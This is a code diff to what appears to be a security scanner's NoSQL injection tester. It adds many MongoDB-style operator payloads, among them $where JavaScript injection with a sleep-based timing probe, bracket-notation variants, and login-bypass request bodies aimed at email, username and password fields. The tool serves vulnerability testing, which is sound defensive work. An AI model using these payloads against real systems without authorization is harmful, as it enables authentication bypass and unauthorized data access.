@@ -38,11 +38,43 @@ logger = logging.getLogger("numasec.scanners.nosql_tester")
 # ---------------------------------------------------------------------------
 
 _NOSQL_PAYLOADS: list[str] = [
+    # Comparison operators
     '{"$gt": ""}',
     '{"$ne": null}',
+    '{"$ne": ""}',
+    '{"$gte": ""}',
+    '{"$lt": "~"}',
+    '{"$lte": "~"}',
+    '{"$in": ["admin", "root", "test"]}',
+    '{"$nin": [""]}',
+    # Logical operators
+    '{"$or": [{"$gt": ""}, {"$ne": null}]}',
+    '{"$and": [{"$ne": null}, {"$ne": ""}]}',
+    '{"$not": {"$eq": ""}}',
+    # Element operators
+    '{"$exists": true}',
+    '{"$type": "string"}',
+    # Regex
     '{"$regex": ".*"}',
+    '{"$regex": "^a"}',
+    # Array operators
+    '{"$all": [""]}',
+    '{"$elemMatch": {"$gt": ""}}',
+    '{"$size": 0}',
+    # JavaScript injection (critical)
+    '{"$where": "1==1"}',
+    '{"$where": "this.password.match(/.*/)"}',
+    '{"$where": "sleep(500)"}',
+    # Evaluation operators
+    '{"$expr": {"$gt": ["$password", ""]}}',
+    '{"$mod": [1, 0]}',
+    '{"$text": {"$search": "admin"}}',
+    # Bracket-notation variants (PHP/Express)
     "[$ne]=1",
     "[%24gt]=",
+    "[$exists]=true",
+    "[$regex]=.*",
+    "[$where]=1==1",
 ]
 
 _NOSQL_SUCCESS_INDICATORS: list[str] = [
@@ -296,6 +328,12 @@ class NoSqlTester:
             ('{"$gt": ""}', {"email": {"$gt": ""}, "password": {"$gt": ""}}),
             ('{"$regex": ".*"}', {"email": {"$regex": ".*"}, "password": {"$regex": ".*"}}),
             ('{"$ne": null}', {"email": {"$ne": None}, "password": {"$ne": None}}),
+            ('{"$in": [...]}', {"email": {"$in": ["admin", "root"]}, "password": {"$ne": ""}}),
+            ('{"$where": "1==1"}', {"email": "admin", "password": {"$where": "1==1"}}),
+            ('{"$exists": true}', {"email": {"$exists": True}, "password": {"$exists": True}}),
+            # username/password variant (common field names)
+            ('username $ne', {"username": {"$ne": ""}, "password": {"$ne": ""}}),
+            ('user $ne', {"user": {"$ne": ""}, "pass": {"$ne": ""}}),
         ]
 
         for payload_desc, json_body in operator_payloads:
